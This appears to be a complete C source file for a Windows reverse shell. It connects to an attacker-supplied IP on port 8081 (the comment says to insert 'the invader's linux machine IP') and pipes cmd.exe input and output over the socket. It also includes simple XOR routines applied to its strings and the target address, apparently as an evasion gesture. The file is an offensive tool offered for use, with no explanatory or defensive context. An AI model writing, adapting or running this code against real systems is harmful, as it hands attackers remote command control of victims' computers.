#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#pragma comment(lib, "ws2_32")

void xor_obfuscate(char *input, char key) {
    int length = strlen(input);
    for (int i = 0; i < length; i++) {
        input[i] ^= key;
    }
    printf("Obfuscated String (XOR): %s\n", input);
}

void xor_deobfuscate(char *input, char key) {
    int length = strlen(input);
    for (int i = 0; i < length; i++) {
        input[i] ^= key;
    }
    printf("Deobfuscated String: %s\n", input);
}

int main()
{
    char xorKey = 0xAA;
    SOCKET Shell;
    SOCKADDR_IN shellAddress;
    WSADATA wsa;
    STARTUPINFO startup_info;
    PROCESS_INFORMATION pi;
    char RecvServer[512]; // Hold receiving data (512 bytes)
    char ipAddress[] = "xxx.xxx.xxx.xxx"; // Insert the invader's linux machine IP here
    int connect;
    int port = 8081;
    char err1[] = "[!] WSAStartup failed, error code: %d\n";
    char err2[] = "[!] Socket creation failed, error code: %d\n";
    char err3[] = "[!] Error while connecting to target server, error code: %d\n";
    char cmmnd[] = "cmd.exe";
    char err4[] = "[!] CreateProcess failed, error code: %d\n";

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        xor_obfuscate(err1, xorKey);
        xor_deobfuscate(err1, xorKey);
        printf(err1, WSAGetLastError());
        return 1;
    }

    Shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (Shell == INVALID_SOCKET)
    {
        xor_obfuscate(err2, xorKey);
        xor_deobfuscate(err2, xorKey);
        printf(err2, WSAGetLastError());
        WSACleanup();
        return 1;
    }

    shellAddress.sin_port = htons(port);
    shellAddress.sin_family = AF_INET;
    xor_obfuscate(ipAddress, xorKey);
    xor_deobfuscate(ipAddress, xorKey);
    shellAddress.sin_addr.s_addr = inet_addr(ipAddress);

    connect = WSAConnect(Shell, (SOCKADDR *)&shellAddress, sizeof(shellAddress), NULL, NULL, NULL, NULL);
    if (connect == SOCKET_ERROR)
    {
        xor_obfuscate(err3, xorKey);
        xor_deobfuscate(err3, xorKey);
        printf(err3, WSAGetLastError());
        Sleep(30000);
        closesocket(Shell);
        WSACleanup();
        return 1;
    }

    recv(Shell, RecvServer, sizeof(RecvServer), 0);
    memset(&startup_info, 0, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE)Shell;

    if (!CreateProcess(NULL, cmmnd, NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &pi))
    {
        xor_obfuscate(err4, xorKey);
        xor_deobfuscate(err4, xorKey);
        printf(err4, WSAGetLastError());
        closesocket(Shell);
        WSACleanup();
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    closesocket(Shell);
    WSACleanup();

    //printf("[*] Shell process completed. Press any key to exit...");
    //getchar();

    return 0;
}